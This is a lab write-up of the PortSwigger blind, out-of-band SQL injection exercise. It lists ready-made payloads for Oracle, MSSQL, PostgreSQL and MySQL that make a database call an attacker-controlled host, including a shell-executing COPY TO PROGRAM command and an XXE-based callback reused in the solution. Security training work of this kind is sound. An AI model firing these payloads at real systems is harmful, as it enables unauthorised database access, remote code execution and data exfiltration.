+++
title = "SQLi Vulnerabilities: Lab 13: Blind SQL injection with out-of-band interaction"
date = 2025-12-08
lastmod = 2025-12-08
draft = false
author = "bloodstiller"
description = "PortSwigger sqli lab write-up using blind out of band SQL Injection to extract data" 
tags = [
  "WebSecurity",
  "PortSwigger",
  "web-exploitation",
  "security-research",
  "portswigger-labs",
  "ctf-writeup",
  "injection",
  "sql",
  "sqli",
  "out-of-band",
  "blind"
]
keywords = [
  "authentication vulnerabilities",
  "SQL",
  "SQLi",
  "PortSwigger authentication lab",
  "web security"
]
toc = true
bold = true
next = true
+++

## Lab 13: Blind SQL injection with out-of-band interaction: {#lab-13-blind-sql-injection-with-out-of-band-interaction}

+Note+: This lab requires burp collaborator to complete which is only available with burpsuite professional, you can easily sign up for a burpsuite professional trial but for some reason they do not accept gmail accounts so use something else.

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
>
> The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
>
> To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.


### Initial Reconnaissance/Discovery: {#initial-reconnaissance-discovery}

We are given access to the standard shop again.
![](/ox-hugo/2025-12-08_10-11.png)


### Straight To Exploitation: {#straight-to-exploitation}

Due to the nature of this type of SQLi, we cannot just check for SQLi, like we normally would by inserting single quotes or trying to elicit a different response as a means to infer YES or NO. Instead we need to start by just throwing payloads at it.

If we look at the [SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) there are provided payloads, however I have edited them below so they are ready for the lab straight away and can be injected straight after the known vulnerable `TrackingId` cookie. I've also added additional clarifying information as it's all fair and well to just throw payloads at things but if we do not know what they are doing then what is the point?


### Oracle OAST Payloads: {#oracle-oast-payloads}

```sql
'|| (SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://[BURP-COLLABORATOR-URL]"> %remote;]>'), '/l') FROM dual)--
```

+Notes+:  This takes advantage of an XXE vulnerability to trigger the DNS lookup; it requires that Oracle XML parsing enabled and the DB process to be able to reach out over HTTP; may be blocked by network ACLs. This has been patched but as the cheatsheet points out there are lots of un-patched Oracle instances out there.

```sql
' || (SELECT UTL_INADDR.get_host_address('[BURP-COLLABORATOR_URL]') FROM dual)--
```

+Notes+:

-   [UTL_INADDR](https://docs.oracle.com/en/database/oracle/oracle-database/26/arpls/UTL_INADDR.html#GUID-5B2C8AA8-4B33-405E-9CAD-D5C009A79F09) package grants network access and is controlled by [DBMS_NETWORK_ACL_ADMIN](https://docs.oracle.com/en/database/oracle/oracle-database/26/arpls/DBMS_NETWORK_ACL_ADMIN.html) (which is the package used to interface with the NACL (Network access control list)).
-   The `get_host_address` functioned is used to retrieve the IP address (make the DNS query of our specified host)


### Microsoft SQL OAST Server Payloads: {#microsoft-sql-oast-server-payloads}

```sql
'; EXEC master..xp_dirtree '\\\\[BURP-COLLABORATOR-URL]';--

--Or if embedding in a string concatenation context:
' + CHAR(13) + CHAR(10) + 'EXEC master..xp_dirtree '\\\\[BURP-COLLABORATOR-URL]'--
```

+Notes+:

-   `xp_dirtree` is an extended stored procedure in Microsoft SQL Server. It's used to list the directory structure (files and subdirectories) of a specified path on the server. This means we can specify a URL we control and have it call out that.


### PosgreSQL OAST Payloads: {#posgresql-oast-payloads}

```sql
'; COPY (SELECT '') TO PROGRAM 'nslookup [BURP-COLLABORATOR-URL]'; --
```

+Notes+:
[COPY TO](https://www.postgresql.org/docs/current/sql-copy.html) copies the contents of a table to a file, however if we use the `PROGRAM` parameter the input  we provide is written to the standard input of the command which is executed by the system shell, which is +RCE+. As `nslookup` is available on most hosts we can use that as easy way to reach out to our endpoint.


### MySQL OAST Payloads: {#mysql-oast-payloads}

```sql
--Write string into a remote share (Windows server account must have permission):
'; SELECT LOAD_FILE('\\\\[BURP-COLLABORATOR-URL]\\file.txt'); --

'; SELECT 'x' INTO OUTFILE '\\\\[BURP-COLLABORATOR-URL]\\exfil.txt'; --
```

+Notes+:

-   The [LOAD_FILE()](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_load-file) function reads a file and returns the content as a string, in this case we specify our malicious server as the location of the file.
-   [SELECT &#x2026; INTO OUTFILE](https://dev.mysql.com/doc/refman/8.4/en/select-into.html) works similar into `LOAD_FILE()` but instead of reading the file we specify it instead writes the selected rows of a table to a file.
-   Many MySQL installations prevent `INTO OUTFILE` writing to arbitrary locations, and `LOAD_FILE` requires `FILE` privilege and `secure_file_priv` settings may restrict paths.
-   Remember to escape backslashes appropriately because&#x2026;.windows&#x2026;


### Solving Lab: {#solving-lab}

Normally I would suggest putting all of our payloads into intruder and doing it that way, however with this it's easier to try the payloads manually.

First open collaborator and get the unique URL id.
![](/ox-hugo/2025-12-08_13-12.png)

We can now start testing paylods.

The payload that gives me an initial different response is the first Oracle one. As we can see there is a `500` response when not the URL is not encoded.
![](/ox-hugo/2025-12-08_10-55.png)

```sql
--URL Unencoded
'|| (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://zdg30pyy37krlmoggnt866tyzp5gtdh2.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```

When we encode the payload we get a standard `200` response.
![](/ox-hugo/2025-12-08_10-54.png)

```sql
--URL Encoded
'||+(SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//zdg30pyy37krlmoggnt866tyzp5gtdh2.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual)--

```

We also get a hit in burp collaborator.
![](/ox-hugo/2025-12-08_10-53.png)

This in turn solves the lab.
![](/ox-hugo/2025-12-08_10-52.png)
